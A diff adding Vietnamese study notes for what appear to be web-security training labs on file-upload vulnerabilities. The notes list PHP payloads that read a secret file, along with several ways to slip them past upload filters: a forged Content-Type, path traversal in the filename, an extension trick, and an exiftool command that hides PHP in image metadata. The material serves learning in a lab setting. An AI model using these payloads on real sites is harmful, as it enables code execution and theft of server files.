@@ -1,3 +1,18 @@
 1: Nội dung file php upload: <?php echo file_get_contents('/home/carlos/secret'); ?>
 
-2:
+2: Khi upload file ở câu 1 lên ta thấy thất bại, chuyển req POST đó vào repeater replace phần type thành: Content-Type: image/png
+
+3: Gửi post req với content-type: plain/text và file name có thêm "..%2f":
+filename="..%2ftest.php"
+Content-Type: plain/text
+
+4: Xem solution
+
+5: 
+Content-Disposition: form-data; name="avatar"; filename="test.php#.png"
+Content-Type: text/plain
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+6: Dùng tool exiftool để append comment vào file ảnh rồi chuyển nó thành file php
+Nội dung lệnh: exiftool -Comment="<?php echo '||||||| '.file_get_contents('/home/carlos/secret').' ||||||||'; ?>" 99.jpg -o test.php
